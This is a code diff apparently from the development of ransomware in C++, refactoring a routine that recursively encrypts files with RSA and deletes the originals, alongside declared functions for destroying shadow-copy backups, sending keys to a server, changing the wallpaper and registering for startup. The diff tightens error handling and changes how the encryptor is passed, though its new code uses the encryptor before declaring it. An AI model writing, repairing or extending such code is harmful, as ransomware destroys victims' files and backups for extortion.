@@ -18,8 +18,9 @@ DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
 Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id);
 void changeHiddenFileState(bool state);
 void destroyVSS();
-static void iterate(const path& parent, RsaEncryptor rsaEncryptor,
-	std::vector<string> processedPaths);
+static void iterate(const path& parent, const string & mod,
+	const string& exp,
+	std::vector<string>& processedPaths);
 Status changeWallPaper(const string&);
 Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob);
 void doRestart();
@@ -47,7 +48,6 @@ int encryption_main( bool fromStart) {
 	string pubKey;
 	string path = ROOT_DIR;
 	string pathToImage = get_path_to_jpeg();
-	RsaEncryptor Enc;
 #if VM
 	RegisterProgram();
 #endif
@@ -90,8 +90,6 @@ int encryption_main( bool fromStart) {
 	}
 
 
-	rsaEncryptor.init_Encryptor(mod, pubKey);
-
 	status = LimitCPU(hCurrentProcess, hJob);
 	if(LIMIT_CPU_FAIL == status)
 	{
@@ -114,18 +112,19 @@ int encryption_main( bool fromStart) {
 	IDFile.open(pathToID, std::ios::out);
 	if(!IDFile.is_open())
 	{
-		std::cout << "Failed to open file: " << GetLastError() << std::endl;
+		std::cout << "Failed to open " + pathToID + ": " << GetLastError() << std::endl;
+		return -1;
 	}
 	IDFile << NOT_FINISHED_ENCRYPTION;
 	IDFile.write((char*)id, ID_LEN);
 	IDFile.close();
 	makeFileHidden(pathToID);
 
-
 	pubFile.open(pathToENC, std::ios::out);
-	if (!IDFile.is_open())
+	if (!pubFile.is_open())
 	{
-		std::cout << "Failed to open file: " << GetLastError() << std::endl;
+		std::cout << "Failed to open " + pathToENC + ": " << GetLastError() << std::endl;
+		return -1;
 	}
 	pubFile << "<Modulus>"<< mod << "</Modulus><Exponent>" << pubKey << "</Exponent>";
 	pubFile.close();
@@ -140,7 +139,7 @@ int encryption_main( bool fromStart) {
 #endif
 
 //	encrypt(path, masterIV, masterKey);
-	iterate(path, rsaEncryptor, processed);
+	iterate(path, mod, pubKey, processed);
 	for(auto& path : processed)
 	{
 		remove(path);
@@ -530,8 +529,9 @@ void RegisterProgram()
 	RegisterMyProgramForStartup(L"My_Program", szPathToExe, L"-foobar");
 }
 
-static void iterate(const path& parent, RsaEncryptor rsaEncryptor,
-	std::vector<string> processedPaths)
+static void iterate(const path& parent, const string & mod,
+	const string& exp,
+	std::vector<string>& processedPaths)
 {
 	string path;
 	directory_iterator end_itr;
@@ -544,12 +544,14 @@ static void iterate(const path& parent, RsaEncryptor rsaEncryptor,
 		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
 			if (is_valid_folder(path))
 			{
-				iterate(path, rsaEncryptor, processedPaths);
+				iterate(path, mod, exp, processedPaths);
 			}
 		}
 		else {
 			if (!do_encrypt(path)) continue;//see TODO 2 rows below
 			status = encrypt(path, rsaEncryptor);
+			RsaEncryptor rsaEncryptor;
+			rsaEncryptor.init_Encryptor(mod, exp);
 			//TODO consider adding to "process" of encrypt, will cause an ugly wrapper for decrypt
 			if(!NT_SUCCESS(status))
 			{
